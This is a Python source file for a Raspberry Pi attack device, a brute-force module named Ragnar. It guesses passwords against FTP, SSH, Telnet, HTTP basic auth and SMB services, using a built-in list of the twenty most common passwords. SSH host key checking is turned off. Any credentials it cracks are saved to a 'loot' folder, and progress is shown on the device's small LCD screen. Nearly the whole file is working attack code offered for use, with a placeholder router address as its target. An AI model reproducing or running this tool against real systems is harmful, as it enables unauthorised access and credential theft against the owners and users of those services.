#!/usr/bin/env python3
"""
Ragnar Brute-Force Module
==========================
Brute-force attack module for Ragnar.
Supports: FTP, SSH, SMB, Telnet, HTTP

Features:
  - Service selection
  - Built-in wordlists (top passwords)
  - Progress display on LCD
  - Auto-stop on found credential
  - Save credentials to loot
"""

import os
import sys
import time
import threading
import subprocess
from datetime import datetime
from pathlib import Path

# Try multiple possible RaspyJack installation paths
possible_roots = [
    os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")),
    "/root/Raspyjack",
    "/home/pi/Raspyjack",
    "/opt/Raspyjack",
]
for root in possible_roots:
    if root not in sys.path and os.path.isdir(root):
        sys.path.insert(0, root)

try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    from payloads._input_helper import get_button
    HAS_LCD = True
except ImportError:
    HAS_LCD = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
W, H = 128, 128

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

# Services and their default ports
SERVICES = {
    "FTP": {"port": 21, "default_user": "anonymous"},
    "SSH": {"port": 22, "default_user": "root"},
    "TELNET": {"port": 23, "default_user": "admin"},
    "HTTP": {"port": 80, "default_user": "admin"},
    "SMB": {"port": 445, "default_user": "administrator"},
}

# Small built-in wordlist (top 20 passwords)
DEFAULT_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "shadow", "master", "666666", "qwerty123456",
]

# Loot directory
LOOT_DIR = Path("/root/Raspyjack/loot/Ragnar/")
LOOT_DIR.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------
GREEN = "#00FF00"
RED = "#FF0000"
YELLOW = "#FFFF00"
CYAN = "#00FFFF"
WHITE = "#FFFFFF"
BLACK = "#000000"
GRAY = "#808080"

# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------
state = {
    "attacking": False,
    "service": None,
    "target": "",
    "username": "root",
    "password": "",
    "found_creds": [],
    "attempts": 0,
    "total_attempts": 0,
    "progress": 0,
    "current_wordlist": [],
    "wordlist_index": 0,
    "stop_attack": False,
    "frame_index": 0,
}

# ---------------------------------------------------------------------------
# GPIO Setup
# ---------------------------------------------------------------------------
if HAS_LCD:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    
    font_small = ImageFont.load_default()
    font_tiny = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 8)
    
    canvas = Image.new("RGB", (W, H), BLACK)
    draw = ImageDraw.Draw(canvas)

# ---------------------------------------------------------------------------
# Attack Functions
# ---------------------------------------------------------------------------
def load_wordlist(wordlist_file=None):
    """Load password list."""
    passwords = []
    
    if wordlist_file and os.path.exists(wordlist_file):
        with open(wordlist_file, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    else:
        # Use default small wordlist
        passwords = DEFAULT_PASSWORDS
    
    return passwords

def try_ftp(target, username, password):
    """Try FTP login."""
    try:
        import ftplib
        ftp = ftplib.FTP(target, timeout=5)
        ftp.login(username, password)
        ftp.quit()
        return True
    except Exception:
        return False

def try_ssh(target, username, password):
    """Try SSH login via paramiko or subprocess."""
    try:
        # Use sshpass if available
        result = subprocess.run(
            ["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no",
             "-o", "ConnectTimeout=3", f"{username}@{target}", "echo", "connected"],
            capture_output=True, timeout=5
        )
        return result.returncode == 0
    except Exception:
        return False

def try_telnet(target, username, password):
    """Try Telnet login."""
    try:
        import telnetlib
        tn = telnetlib.Telnet(target, timeout=5)
        tn.read_until(b"login: ")
        tn.write(f"{username}\n".encode())
        tn.read_until(b"Password: ")
        tn.write(f"{password}\n".encode())
        result = tn.read_some()
        tn.quit()
        return b"Login" not in result or b"$" in result
    except Exception:
        return False

def try_http(target, username, password):
    """Try HTTP basic auth."""
    try:
        import requests
        auth = requests.auth.HTTPBasicAuth(username, password)
        resp = requests.get(f"http://{target}", auth=auth, timeout=5)
        return resp.status_code == 200
    except Exception:
        return False

def try_smb(target, username, password):
    """Try SMB login via smbclient or enum4linux."""
    try:
        result = subprocess.run(
            ["smbclient", f"//{target}/IPC$", "-U", f"{username}%{password}",
             "-c", "exit"],
            capture_output=True, timeout=5
        )
        return result.returncode == 0
    except Exception:
        return False

def try_login(service, target, username, password):
    """Try login based on service type."""
    if service == "FTP":
        return try_ftp(target, username, password)
    elif service == "SSH":
        return try_ssh(target, username, password)
    elif service == "TELNET":
        return try_telnet(target, username, password)
    elif service == "HTTP":
        return try_http(target, username, password)
    elif service == "SMB":
        return try_smb(target, username, password)
    return False

def attack_worker():
    """Run brute-force attack in background."""
    state["attacking"] = True
    state["stop_attack"] = False
    
    service = state["service"]
    target = state["target"]
    username = state["username"]
    passwords = state["current_wordlist"]
    
    total = len(passwords)
    
    for i, password in enumerate(passwords):
        if state["stop_attack"]:
            break
        
        state["password"] = password
        state["attempts"] = i + 1
        state["wordlist_index"] = i
        state["progress"] = int((i / total) * 100)
        
        if try_login(service, target, username, password):
            # Found credentials!
            cred = {
                "service": service,
                "target": target,
                "username": username,
                "password": password,
                "timestamp": datetime.now().isoformat()
            }
            state["found_creds"].append(cred)
            save_cred(cred)
            break
    
    state["attacking"] = False

def save_cred(cred):
    """Save found credentials to loot."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    creds_file = LOOT_DIR / f"creds_{timestamp}.txt"
    
    with open(creds_file, "w") as f:
        f.write(f"Ragnar Brute-Force Results\n")
        f.write(f"========================\n")
        f.write(f"Service: {cred['service']}\n")
        f.write(f"Target: {cred['target']}\n")
        f.write(f"Username: {cred['username']}\n")
        f.write(f"Password: {cred['password']}\n")
        f.write(f"Time: {cred['timestamp']}\n")

# ---------------------------------------------------------------------------
# LCD Display Functions
# ---------------------------------------------------------------------------
if HAS_LCD:
    def draw_view():
        """Draw the attack view."""
        draw.rectangle((0, 0, W, H), fill=BLACK)
        
        # Status bar
        draw.rectangle((0, 0, W, 12), fill=RED)
        draw.text((2, 2), "BRUTE FORCE", font=font_tiny, fill=BLACK)
        
        # Attack status
        if state["attacking"]:
            spinner = ["|", "/", "-", "\\"][state["frame_index"] % 4]
            draw.text((W - 20, 2), spinner, font=font_tiny, fill=BLACK)
        
        # Target info
        y = 16
        if state["target"]:
            draw.text((2, y), f"Tgt: {state['target'][:18]}", font=font_tiny, fill=WHITE)
        else:
            draw.text((2, y), "No target", font=font_tiny, fill=GRAY)
        
        # Service
        y = 28
        draw.text((2, y), f"Svc: {state['service'] or 'None'}", font=font_tiny, fill=CYAN)
        
        # Progress
        y = 40
        draw.text((2, y), f"Pass: {state['attempts']}/{len(state['current_wordlist'])}", font=font_tiny, fill=GREEN)
        
        # Current password being tried
        y = 52
        if state["password"]:
            draw.text((2, y), f"Pwd: {state['password'][:16]}", font=font_tiny, fill=YELLOW)
        
        # Progress bar
        y = 70
        progress = state["progress"] / 100.0
        bar_width = int((W - 4) * progress)
        draw.rectangle((2, y, W - 2, y + 8), outline=GRAY)
        if bar_width > 0:
            draw.rectangle((3, y + 1, 3 + bar_width, y + 7), fill=GREEN)
        
        # Found credentials
        y = 84
        draw.text((2, y), f"Found: {len(state['found_creds'])}", font=font_tiny, 
                  fill=GREEN if state["found_creds"] else GRAY)
        
        # Controls
        draw.text((2, H - 10), "K1:Start K2:Stop K3:Exit", font=font_tiny, fill=GRAY)
        
        state["frame_index"] += 1
        LCD.LCD_ShowImage(canvas, 0, 0)

# ---------------------------------------------------------------------------
# Main Attack Loop
# ---------------------------------------------------------------------------
def main():
    """Main attack loop."""
    if not HAS_LCD:
        print("LCD not available, running in headless mode")
        return
    
    # Initialize GPIO
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    
    # Load default wordlist
    state["current_wordlist"] = DEFAULT_PASSWORDS
    state["total_attempts"] = len(DEFAULT_PASSWORDS)
    
    running = True
    
    while running:
        draw_view()
        
        button = get_button(PINS, GPIO)
        
        if button is None:
            time.sleep(0.2)
            continue
        
        # Wait for button release
        while get_button(PINS, GPIO) is not None:
            time.sleep(0.05)
        time.sleep(0.1)
        
        if button == "KEY3":
            running = False
        
        elif button == "KEY1" and not state["attacking"]:
            # Start attack - use placeholder target for now
            # In full integration, this would come from scan results
            state["target"] = "192.168.1.1"
            state["service"] = "FTP"
            state["username"] = "root"
            state["attempts"] = 0
            state["found_creds"] = []
            
            # Start attack in background
            thread = threading.Thread(target=attack_worker, daemon=True)
            thread.start()
        
        elif button == "KEY2" and state["attacking"]:
            # Stop attack
            state["stop_attack"] = True
    
    GPIO.cleanup()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    finally:
        if HAS_LCD:
            GPIO.cleanup()
